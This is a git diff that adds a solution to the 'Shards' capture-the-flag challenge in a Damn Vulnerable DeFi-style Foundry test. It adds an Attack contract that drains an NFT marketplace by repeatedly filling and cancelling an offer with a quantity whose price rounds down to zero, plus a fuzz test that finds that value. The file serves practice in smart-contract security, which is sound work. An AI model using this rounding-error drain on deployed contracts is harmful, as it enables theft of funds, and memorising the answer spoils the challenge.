@@ -12,6 +12,23 @@ import {
 } from "../../src/shards/ShardsNFTMarketplace.sol";
 import {DamnValuableStaking} from "../../src/DamnValuableStaking.sol";
 
+contract Attack {
+    function attack(ShardsNFTMarketplace marketplace, DamnValuableToken token, address recovery) external {
+        // let's run with want being 253
+        // get the offer index
+        uint64 currentOfferId = marketplace.offerCount();
+        uint256 want = 133;
+
+        for (uint256 i = 0; i < 10000; ++i) {
+            uint256 purchaseId = marketplace.fill(currentOfferId, want);
+            console.log("purhcase Id : ", purchaseId);
+            marketplace.cancel(currentOfferId, purchaseId);
+        }
+
+        token.transfer(recovery, token.balanceOf(address(this)));
+    }
+}
+
 contract ShardsChallenge is Test {
     address deployer = makeAddr("deployer");
     address player = makeAddr("player");
@@ -110,11 +127,30 @@ contract ShardsChallenge is Test {
         assertEq(token.balanceOf(player), 0);
     }
 
+    uint256 wantFound;
+
+    function test_getValueOfWant(uint8 want) public {
+        console.log("first value if s", want);
+        vm.assume(want > 0);
+        // vm.assume(want < 2000);
+        console.log(want);
+        uint256 result = (want * (_toDVT(NFT_OFFER_PRICE, MARKETPLACE_INITIAL_RATE))) / NFT_OFFER_SHARDS;
+        if (result == 0 && want > wantFound) {
+            wantFound = want;
+            console.log("want Found is : ", wantFound);
+        }
+    }
+
+    function _toDVT(uint256 _value, uint256 _rate) private pure returns (uint256) {
+        return (_value * _rate) / 1e6;
+    }
+
     /**
      * CODE YOUR SOLUTION HERE
      */
     function test_shards() public checkSolvedByPlayer {
-        
+        Attack att = new Attack();
+        att.attack(marketplace, token, recovery);
     }
 
     /**
